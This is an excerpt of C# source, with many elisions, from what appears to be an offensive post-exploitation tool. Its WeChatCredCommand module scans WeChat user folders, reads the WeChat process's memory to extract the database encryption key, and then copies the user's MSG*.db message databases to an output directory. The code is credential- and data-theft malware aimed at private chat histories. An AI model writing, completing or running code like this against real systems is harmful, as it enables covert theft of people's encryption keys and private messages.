...
namespace GodInfo.Commands
{
    public class WeChatCredCommand : ICommand
    {
            ...
            if (Directory.Exists(path))
            {
                ...
                foreach (string subdirectory in subdirectories)
                {
                    ...
                    if (Directory.Exists(msgFolderPath))
                    {
                        ...
                        {
                            bool keyFound = GetWechatKey(UserNameBytes);
                            
                            // 如果成功获取到WechatKey，复制数据库文件
                            if (keyFound)
                            {
                                CopyMsgDatabases(subdirectory, folderName);
                            }
                        }
                    }
                }
        ...
        private static void CopyMsgDatabases(string userDirectory, string wxid)
        {
            try
            {
                string msgMultiPath = Path.Combine(userDirectory, "Msg", "Multi");
                if (!Directory.Exists(msgMultiPath))
                {
                    return;
                }

                // 创建输出目录
                string outputDir = Path.Combine(Logger.globalLogDirectory, "WeChat", wxid);
                Directory.CreateDirectory(outputDir);

                // 查找所有MSG*.db文件
                string[] msgFiles = Directory.GetFiles(msgMultiPath, "MSG*.db");
                
                if (msgFiles.Length == 0)
                {
                    Logger.WriteLine(string.Format(" [-] No MSG database files found for {0}", wxid));
                    return;
                }
                ...
                foreach (string msgFile in msgFiles)
                {
                    ...
                    try
                    {
                        ...
                        long fileSize = new FileInfo(msgFile).Length / (1024 * 1024); // 转换为MB
                        Logger.WriteLine(string.Format(" [+] Copied {0} ({1}MB) to {2}", fileName, fileSize, outputDir));
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine(string.Format(" [-] Failed to copy {0}: {1}", fileName, ex.Message));
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine(string.Format(" [-] Error copying message databases: {0}", ex.Message));
            }
        }
        ...
        private static bool GetWechatKey(byte[] UserNameBytes)
        {
            ...
            try
            {
                ...
                if (NTAPI.ReadProcessMemory(processHandle, moduleBaseAddress, buffer, buffer.Length, out int bytesRead))
                {
                    ...
                    if (matchIndex != -1)
                    {
                        ...
                        // 如果key获取成功且有效，标记为已找到
                        if (!string.IsNullOrEmpty(key) && key.Length > 10 && !key.StartsWith("1") && !key.StartsWith("2;"))
                        {
                            keyFound = true;
                        }
                    }
